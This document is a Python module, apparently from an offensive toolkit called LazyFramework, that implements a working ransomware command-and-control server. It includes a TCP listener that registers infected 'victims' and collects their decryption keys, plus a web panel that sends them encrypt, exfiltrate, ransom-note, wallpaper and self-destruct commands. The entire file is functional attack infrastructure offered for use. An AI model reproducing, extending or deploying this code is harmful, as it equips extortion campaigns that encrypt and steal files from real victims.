#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "C2 Server",
    "description": "Command & Control Server for Ransomware (with command sending)",
    "author": "LazyFramework",
    "platform": "multi",
    "rank": "Normal",
    "types": "payloads",
    "category": "payloads",
    "dependencies": ["flask", "flask-socketio"]
}

OPTIONS = {
    "LHOST": {
        "default": "0.0.0.0",
        "required": True,
        "description": "Listen IP address"
    },
    "LPORT": {
        "default": 4444,
        "required": True,
        "description": "Listen port"
    },
    "WEB_PORT": {
        "default": 5000,
        "required": True,
        "description": "Web panel port"
    },
    "C2_PASSWORD": {
        "default": "admin",
        "required": False,
        "description": "Web panel password"
    }
}

import os
import sys
import json
import threading
import socket
import time
from datetime import datetime

# ==================== C2 SERVER ====================

class C2Server:
    def __init__(self, host, port, web_port, password):
        self.host = host
        self.port = port
        self.web_port = web_port
        self.password = password
        self.victims = {}  # {client_id: {'ip': ip, 'port': port, 'status': status, 'socket': sock, ...}}
        self.running = False
        self.socket = None
        self.web_thread = None
        self.client_id_counter = 0
        self.lock = threading.Lock()
        
    def start(self):
        """Start C2 Server"""
        self.running = True
        
        # Start TCP listener
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.host, self.port))
        self.socket.listen(10)
        
        print(f"[*] C2 Server listening on {self.host}:{self.port}")
        print(f"[*] Web panel on http://{self.host}:{self.web_port}")
        print(f"[*] Password: {self.password}")
        
        # Start web panel
        self.web_thread = threading.Thread(target=self._run_web_panel, daemon=True)
        self.web_thread.start()
        
        # Main loop
        while self.running:
            try:
                self.socket.settimeout(1.0)
                client, addr = self.socket.accept()
                self.client_id_counter += 1
                client_id = f"victim_{self.client_id_counter}"
                
                with self.lock:
                    self.victims[client_id] = {
                        "id": client_id,
                        "ip": addr[0],
                        "port": addr[1],
                        "status": "connected",
                        "socket": client,
                        "first_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "os": "unknown",
                        "hostname": "unknown",
                        "user": "unknown",
                        "is_admin": False,
                        "decrypt_key": "",
                        "encrypted": False,
                        "encrypted_count": 0,
                        "messages": []
                    }
                
                print(f"[+] New victim connected: {client_id} from {addr[0]}:{addr[1]}")
                threading.Thread(target=self._handle_client, args=(client, addr, client_id), daemon=True).start()
                
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"[!] Error: {e}")
    
    def _handle_client(self, client, addr, client_id):
        """Handle client connection"""
        try:
            client.settimeout(5)
            buffer = ""
            
            while self.running:
                try:
                    data = client.recv(4096).decode()
                    if not data:
                        break
                    buffer += data
                    
                    while '\n' in buffer:
                        line, buffer = buffer.split('\n', 1)
                        try:
                            msg = json.loads(line)
                            self._process_message(client_id, client, msg)
                        except json.JSONDecodeError:
                            pass
                except socket.timeout:
                    continue
                except:
                    break
        except:
            pass
        finally:
            with self.lock:
                if client_id in self.victims:
                    self.victims[client_id]["status"] = "disconnected"
            try:
                client.close()
            except:
                pass
            print(f"[*] Victim {client_id} disconnected")
    
    def _process_message(self, client_id, client, msg):
        """Process message from victim"""
        with self.lock:
            if client_id not in self.victims:
                return
            
            victim = self.victims[client_id]
            victim["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            victim["messages"].append(msg)
            
            msg_type = msg.get("type", "")
            
            if msg_type == "register":
                victim["os"] = msg.get("os", "unknown")
                victim["hostname"] = msg.get("hostname", "unknown")
                victim["user"] = msg.get("user", "unknown")
                victim["is_admin"] = msg.get("is_admin", False)
                victim["decrypt_key"] = msg.get("decrypt_key", "")
                victim["status"] = "registered"
                print(f"[+] Victim {client_id} registered: {victim['hostname']} ({victim['os']})")
                
            elif msg_type == "encrypt_response":
                victim["encrypted"] = True
                victim["encrypted_count"] = msg.get("files_encrypted", 0)
                victim["status"] = "encrypted"
                print(f"[+] Victim {client_id} encrypted {victim['encrypted_count']} files")
                
            elif msg_type == "decrypt_response":
                victim["encrypted"] = False
                victim["encrypted_count"] = 0
                victim["status"] = "decrypted"
                print(f"[+] Victim {client_id} decrypted {msg.get('files_decrypted', 0)} files")
                
            elif msg_type == "status_response":
                victim["encrypted"] = msg.get("encrypted", False)
                victim["encrypted_count"] = msg.get("encrypted_files", 0)
                victim["status"] = "active"
                print(f"[+] Victim {client_id} status: encrypted={victim['encrypted']}")
    
    def send_command(self, client_id, command):
        """Send command to specific victim"""
        with self.lock:
            if client_id not in self.victims:
                return False, "Victim not found"
            
            victim = self.victims[client_id]
            sock = victim.get("socket")
            
            if not sock:
                return False, "Victim socket not available"
            
            try:
                cmd_json = json.dumps(command) + '\n'
                sock.send(cmd_json.encode())
                victim["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                return True, "Command sent"
            except Exception as e:
                return False, f"Failed to send: {e}"
    
    def _run_web_panel(self):
        """Run Flask web panel with command sending"""
        try:
            from flask import Flask, render_template_string, jsonify, request, redirect, url_for, session
            from flask import send_from_directory
            import webbrowser
            
            app = Flask(__name__)
            app.secret_key = os.urandom(16)
            
            HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Lazy C2 Panel</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Consolas', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
        h1 { color: #ff0000; border-bottom: 1px solid #ff0000; padding-bottom: 10px; margin-bottom: 20px; }
        .stats { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
        .stat-box { background: #1a1a1a; padding: 15px 25px; border: 1px solid #00ff00; border-radius: 4px; }
        .stat-box .label { color: #888; font-size: 10px; text-transform: uppercase; }
        .stat-box .value { font-size: 24px; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th { text-align: left; padding: 10px; border-bottom: 2px solid #00ff00; color: #00ff00; }
        td { padding: 10px; border-bottom: 1px solid #333; }
        tr:hover { background: #1a1a1a; }
        .status-connected { color: #00ff00; }
        .status-registered { color: #00ffff; }
        .status-encrypted { color: #ff0000; font-weight: bold; }
        .status-decrypted { color: #00ff00; }
        .status-disconnected { color: #ff5555; }
        .status-active { color: #00ff00; }
        .btn { background: #00ff00; color: #000; border: none; padding: 6px 12px; cursor: pointer; border-radius: 3px; font-weight: bold; font-size: 11px; margin: 2px; }
        .btn:hover { opacity: 0.8; }
        .btn-danger { background: #ff0000; color: #fff; }
        .btn-warning { background: #ffaa00; color: #000; }
        .btn-info { background: #00aaff; color: #fff; }
        .btn-primary { background: #1f6feb; color: #fff; }
        .refresh { background: #00ff00; color: #000; border: none; padding: 8px 16px; cursor: pointer; border-radius: 4px; font-weight: bold; margin-top: 10px; }
        .refresh:hover { background: #00cc00; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center; }
        .modal-content { background: #1a1a1a; padding: 30px; border: 1px solid #00ff00; border-radius: 8px; max-width: 500px; width: 90%; }
        .modal-content h2 { color: #00ff00; margin-bottom: 20px; }
        .modal-content input, .modal-content select { width: 100%; padding: 10px; margin: 10px 0; background: #0a0a0a; color: #00ff00; border: 1px solid #333; border-radius: 4px; font-family: 'Consolas', monospace; }
        .modal-content .btn { width: 100%; padding: 10px; margin-top: 10px; }
        .close { float: right; color: #ff0000; font-size: 24px; cursor: pointer; }
        .close:hover { color: #ff4444; }
        @media (max-width: 768px) {
            .stats { flex-direction: column; }
            table { font-size: 12px; }
            th, td { padding: 5px; }
        }
    </style>
</head>
<body>
    <h1>☠ LAZY C2 PANEL</h1>
    <div class="stats">
        <div class="stat-box">
            <div class="label">Total Victims</div>
            <div class="value">{{ total_count }}</div>
        </div>
        <div class="stat-box">
            <div class="label">Registered</div>
            <div class="value">{{ registered_count }}</div>
        </div>
        <div class="stat-box">
            <div class="label">Encrypted</div>
            <div class="value" style="color: #ff0000;">{{ encrypted_count }}</div>
        </div>
        <div class="stat-box">
            <div class="label">Total Files Encrypted</div>
            <div class="value">{{ total_files }}</div>
        </div>
    </div>
    
    <button class="refresh" onclick="location.reload()">⟳ Refresh</button>
    
    <table>
        <tr>
            <th>ID</th>
            <th>IP:Port</th>
            <th>Hostname</th>
            <th>OS</th>
            <th>Admin</th>
            <th>Status</th>
            <th>Encrypted</th>
            <th>Actions</th>
        </tr>
        {% for id, data in victims.items() %}
        <tr>
            <td>{{ id }}</td>
            <td>{{ data.ip }}:{{ data.port }}</td>
            <td>{{ data.hostname }}</td>
            <td>{{ data.os }}</td>
            <td>{{ '✅' if data.is_admin else '❌' }}</td>
            <td class="status-{{ data.status }}">{{ data.status }}</td>
            <td>{{ data.encrypted_count if data.encrypted else '0' }}</td>
            <td>
                <button class="btn btn-danger" onclick="sendCommand('{{ id }}', 'encrypt')">🔓 Encrypt</button>
                <button class="btn btn-info" onclick="sendCommand('{{ id }}', 'decrypt')">🔓 Decrypt</button>
                <button class="btn btn-primary" onclick="sendCommand('{{ id }}', 'status')">📊 Status</button>
                <button class="btn btn-warning" onclick="sendCommand('{{ id }}', 'exfiltrate')">📤 Exfil</button>
                <button class="btn btn-danger" onclick="sendCommand('{{ id }}', 'kill')">✕ Kill</button>
            </td>
        </tr>
        {% endfor %}
    </table>
    
    <!-- Modal -->
    <div id="commandModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <h2>Send Command</h2>
            <p>Victim: <strong id="modalVictim"></strong></p>
            <label>Command:</label>
            <select id="modalCommand">
                <option value="encrypt">🔓 Encrypt</option>
                <option value="decrypt">🔓 Decrypt</option>
                <option value="status">📊 Status</option>
                <option value="exfiltrate">📤 Exfiltrate</option>
                <option value="wallpaper">🖼️ Change Wallpaper</option>
                <option value="note">📝 Drop Note</option>
                <option value="ping">🏓 Ping</option>
                <option value="kill">✕ Kill</option>
            </select>
            <label>Parameters (optional, JSON):</label>
            <input type="text" id="modalParams" placeholder='{"key": "value"}' value="{}">
            <button class="btn btn-danger" onclick="sendModalCommand()">Send Command</button>
        </div>
    </div>
    
    <script>
        function sendCommand(id, command) {
            fetch('/send_command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ client_id: id, command: { type: command } })
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
                location.reload();
            })
            .catch(err => alert('Error: ' + err));
        }
        
        function openModal(id) {
            document.getElementById('modalVictim').textContent = id;
            document.getElementById('commandModal').style.display = 'flex';
            document.getElementById('modalVictim').dataset.id = id;
        }
        
        function closeModal() {
            document.getElementById('commandModal').style.display = 'none';
        }
        
        function sendModalCommand() {
            const id = document.getElementById('modalVictim').dataset.id;
            const command = document.getElementById('modalCommand').value;
            const params = document.getElementById('modalParams').value;
            
            let cmd = { type: command };
            try {
                const extra = JSON.parse(params);
                cmd = { ...cmd, ...extra };
            } catch(e) {}
            
            sendCommand(id, cmd.type);
            closeModal();
        }
        
        // Click outside modal to close
        window.onclick = function(event) {
            const modal = document.getElementById('commandModal');
            if (event.target == modal) {
                closeModal();
            }
        }
    </script>
</body>
</html>
            '''
            
            @app.route('/')
            def index():
                with self.lock:
                    total_count = len(self.victims)
                    registered_count = sum(1 for v in self.victims.values() if v['status'] in ['registered', 'active', 'encrypted', 'decrypted'])
                    encrypted_count = sum(1 for v in self.victims.values() if v.get('encrypted', False))
                    total_files = sum(v.get('encrypted_count', 0) for v in self.victims.values())
                    
                    victims_data = {}
                    for vid, vdata in self.victims.items():
                        victims_data[vid] = {
                            "ip": vdata.get("ip", "unknown"),
                            "port": vdata.get("port", "unknown"),
                            "hostname": vdata.get("hostname", "unknown"),
                            "os": vdata.get("os", "unknown"),
                            "is_admin": vdata.get("is_admin", False),
                            "status": vdata.get("status", "unknown"),
                            "encrypted": vdata.get("encrypted", False),
                            "encrypted_count": vdata.get("encrypted_count", 0)
                        }
                
                return render_template_string(
                    HTML_TEMPLATE,
                    victims=victims_data,
                    total_count=total_count,
                    registered_count=registered_count,
                    encrypted_count=encrypted_count,
                    total_files=total_files
                )
            
            @app.route('/send_command', methods=['POST'])
            def send_command_route():
                if not request.is_json:
                    return jsonify({"success": False, "message": "Invalid request"})
                
                data = request.get_json()
                client_id = data.get('client_id')
                command = data.get('command', {})
                
                if not client_id or not command:
                    return jsonify({"success": False, "message": "Missing client_id or command"})
                
                success, message = self.send_command(client_id, command)
                return jsonify({"success": success, "message": message})
            
            @app.route('/victims')
            def victims():
                with self.lock:
                    victims_data = {}
                    for vid, vdata in self.victims.items():
                        victims_data[vid] = {
                            "ip": vdata.get("ip", "unknown"),
                            "port": vdata.get("port", "unknown"),
                            "hostname": vdata.get("hostname", "unknown"),
                            "os": vdata.get("os", "unknown"),
                            "is_admin": vdata.get("is_admin", False),
                            "status": vdata.get("status", "unknown"),
                            "encrypted": vdata.get("encrypted", False),
                            "encrypted_count": vdata.get("encrypted_count", 0)
                        }
                return jsonify(victims_data)
            
            # Open browser
            webbrowser.open(f'http://{self.host}:{self.web_port}')
            
            app.run(host=self.host, port=self.web_port, debug=False, use_reloader=False)
            
        except ImportError as e:
            print(f"[!] Flask not installed: {e}")
            print("[!] Web panel disabled")
        except Exception as e:
            print(f"[!] Web panel error: {e}")
    
    def stop(self):
        """Stop C2 Server"""
        self.running = False
        
        # Close all victim sockets
        with self.lock:
            for client_id, victim in self.victims.items():
                try:
                    sock = victim.get("socket")
                    if sock:
                        sock.close()
                except:
                    pass
        
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        
        print("[*] C2 Server stopped")


# ==================== RUN ====================

def run(session, options):
    """Main module execution"""
    lhost = options.get("LHOST", "0.0.0.0")
    lport = int(options.get("LPORT", 4444))
    web_port = int(options.get("WEB_PORT", 5000))
    password = options.get("C2_PASSWORD", "admin")
    
    print(f"""
╔══════════════════════════════════════════════════════════════════╗
║                    LAZYFRAMEWORK C2 SERVER                       ║
║              (Supports Ransomware C2 Commands)                  ║
╠══════════════════════════════════════════════════════════════════╣
║  LHOST       : {lhost}
║  LPORT       : {lport}
║  WEB_PORT    : {web_port}
║  PASSWORD    : {password}
║                                                                 ║
║  Commands supported:                                            ║
║  - encrypt     : Start encryption on victim                    ║
║  - decrypt     : Decrypt files on victim                      ║
║  - status      : Get victim status                            ║
║  - exfiltrate  : Exfiltrate files from victim                 ║
║  - wallpaper   : Change victim wallpaper                      ║
║  - note        : Drop ransom note on victim                   ║
║  - ping        : Ping victim                                  ║
║  - kill        : Self-destruct victim                         ║
╚══════════════════════════════════════════════════════════════════╝
""")
    
    server = C2Server(lhost, lport, web_port, password)
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
    finally:
        server.stop()
    
    return "C2 Server stopped"